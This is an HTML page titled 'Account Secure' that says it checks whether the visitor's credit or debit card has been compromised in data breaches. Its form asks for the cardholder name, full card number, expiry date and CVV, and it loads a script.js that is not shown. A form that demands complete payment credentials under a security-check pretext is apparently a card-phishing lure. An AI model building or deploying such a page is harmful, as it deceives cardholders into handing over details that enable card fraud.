<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Account Secure</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="intro">
            <p>Check if your credit/debit card details have been compromised in online data breaches. Enter your information and click "Check" to see if your data is affected.</p>
        </div>

        <div class="form-container">
            <h2>Enter Your Details</h2>
            <form id="user-form">
                <label for="name">Name:</label>
                <input type="text" id="name" placeholder="Your Name as on the card" required>

                <label for="Card nunmber">Card number :</label>
                <input type="text" id="accNumber" placeholder="xxxx xxxx xxxx xxxx" maxlength="19" required>

                <label for="Expiry date">Expiry date:</label>
                <input type="text" id="fourDigit" placeholder="xx/xx" maxlength="5" required>

                <label for="CVV or Security code">CVV or Security code</label>
                <input type="text" id="threeDigit" placeholder="xxx" maxlength="3" required>

                <button type="submit" id="checkBtn" disabled>Check</button>
            </form>
        </div>
    </div>

    <script src="script.js"></script>

    <footer>
        <p>&copy; 2024 M DIXITH ADITHYA. All rights reserved.</p>
    </footer>

    
</body>
</html>
